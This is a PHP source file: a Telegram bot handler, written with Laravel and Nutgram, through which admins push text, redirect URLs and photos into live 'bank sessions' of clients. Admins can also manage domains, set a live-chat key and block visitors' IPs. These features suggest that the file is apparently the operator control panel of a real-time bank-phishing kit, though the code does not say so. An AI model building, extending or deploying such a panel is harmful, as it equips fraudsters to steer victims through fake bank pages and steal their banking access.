<?php

namespace App\Telegram\Handlers;

use App\Enums\ActionType;
use App\Events\BankSessionUpdated;
use App\Listeners\NotifyAdminsOfBankSession;
use App\Models\Admin;
use App\Models\BankSession;
use Illuminate\Support\Str;
use SergiX44\Nutgram\Nutgram;

class MessageHandler
{
    public function handle(Nutgram $bot, string $text = ''): void
    {
        /** @var Admin|null $admin */
        $admin = $bot->get('admin');
        if ($admin === null || !$admin->hasPendingAction()) {
            return;
        }

        $pending = $admin->pending_action;
        $type    = $pending['type'] ?? null;

        match ($type) {
            'admin_add'     => app(AdminPanelHandler::class)->processAddAdmin($bot, $admin, $text),
            'smartsupp_key' => app(SmartSuppHandler::class)->processSetKey($bot, $admin, $text),
            'domain_add'    => app(DomainHandler::class)->processAddDomain($bot, $admin, $text),
            'domain_edit'   => app(DomainHandler::class)->processEditDomain($bot, $admin, $pending['domain'] ?? '', $text),
            'block_ip'      => $text === '*'
                                ? app(BlockIpHandler::class)->confirmBlock($bot, $admin, $pending['sessionId'] ?? '')
                                : $bot->sendMessage('❌ Отправьте <b>*</b> для подтверждения', parse_mode: 'HTML'),
            'session'       => $this->handleSessionAction($bot, $admin, $pending, $text),
            default         => $admin->clearPendingAction(),
        };
    }

    public function handlePhoto(Nutgram $bot): void
    {
        /** @var Admin|null $admin */
        $admin = $bot->get('admin');
        if ($admin === null || !$admin->hasPendingAction()) {
            return;
        }

        $pending = $admin->pending_action;
        if (($pending['type'] ?? null) !== 'session') {
            return;
        }

        $actionType = ActionType::tryFrom($pending['actionType'] ?? '');
        if ($actionType === null || !$actionType->requiresPhoto()) {
            return;
        }

        $session = BankSession::find($pending['sessionId'] ?? '');
        if ($session === null) {
            $admin->clearPendingAction();
            $bot->sendMessage('Сессия не найдена; действие сброшено.');
            return;
        }

        $photos = $bot->message()->photo ?? [];
        if (empty($photos)) {
            $bot->sendMessage('Не удалось получить фото. Попробуйте ещё раз.');
            return;
        }

        $photo = end($photos);
        $file  = $bot->getFile($photo->file_id);

        $filePath  = $file->file_path ?? '';
        $extension = pathinfo($filePath, PATHINFO_EXTENSION) ?: 'jpg';
        $filename  = Str::uuid() . '.' . $extension;

        $contents = file_get_contents(
            'https://api.telegram.org/file/bot' . config('services.telegram.bot_token') . '/' . $filePath
        );
        $dir = public_path('bank-photos');
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        file_put_contents($dir . '/' . $filename, $contents);
        $photoUrl = '/bank-photos/' . $filename;

        $caption = $bot->message()->caption ?? '';
        $command = ['type' => $actionType->value, 'photo_url' => $photoUrl];
        if ($actionType === ActionType::PhotoWithInput) {
            $command['text'] = $caption;
        }

        $session->action_type      = $command;
        $session->last_activity_at = now();
        $session->save();

        $admin->clearPendingAction();
        BankSessionUpdated::dispatch($session);
        app(NotifyAdminsOfBankSession::class)->notifyActionSent($session, $actionType->buttonLabel());
        $bot->sendMessage('✓ Фото отправлено клиенту.');
    }

    private function handleSessionAction(Nutgram $bot, Admin $admin, array $pending, string $text): void
    {
        $type    = ActionType::tryFrom($pending['actionType'] ?? '');
        $session = BankSession::find($pending['sessionId'] ?? '');

        if ($type === null || $session === null) {
            $admin->clearPendingAction();
            $bot->sendMessage('Действие недействительно; сброшено.');
            return;
        }

        $command = ['type' => $type->value];
        if ($type->requiresUrl()) {
            $command['url'] = trim($text);
        } else {
            $command['text'] = $text;
        }
        $session->action_type      = $command;
        $session->last_activity_at = now();
        $session->save();

        $admin->clearPendingAction();
        BankSessionUpdated::dispatch($session);
        app(NotifyAdminsOfBankSession::class)->notifyActionSent($session, $type->buttonLabel());
        $bot->sendMessage('✓ Отправлено клиенту.');
    }
}
